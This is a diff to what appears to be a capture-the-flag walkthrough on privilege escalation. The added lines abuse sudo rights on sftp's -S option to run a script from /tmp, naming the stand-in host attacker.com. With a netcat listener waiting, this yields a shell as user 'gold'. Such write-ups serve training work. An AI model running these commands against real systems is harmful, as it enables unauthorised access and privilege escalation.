@@ -77,8 +77,18 @@ Save this in a ```.sh``` file and send it over to the target
 
 Cool, now lets execute that command again, but this time ensure you have your netcat listener set up
 
+command
+```
+chmod +x bash.sh
+HOST=blackanon@attacker.com
+sudo -u gold /usr/bin/sftp -S /tmp/bash.sh $HOST
+```
 
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6ccb23a8-197d-4424-9d63-c7550b1b0765)
 
+It worked, we got a shell as user ```gold```.
+
+Further escalating our privileges
 
 
 
